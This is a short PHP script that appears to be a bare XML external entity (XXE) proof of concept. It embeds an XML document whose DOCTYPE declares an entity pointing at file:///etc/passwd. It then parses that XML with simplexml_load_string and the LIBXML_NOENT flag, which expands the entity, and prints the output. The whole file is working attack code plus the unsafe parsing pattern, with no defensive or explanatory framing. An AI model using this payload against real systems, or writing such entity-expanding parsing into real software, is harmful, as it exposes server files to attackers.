<?php
$string = <<<XML
<?xml version='1.0'?> 
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
<root>
 <name>&test;</name>
</root>
XML;

$xml = simplexml_load_string($string,'SimpleXMLElement',LIBXML_NOENT);

print_r($xml);
?>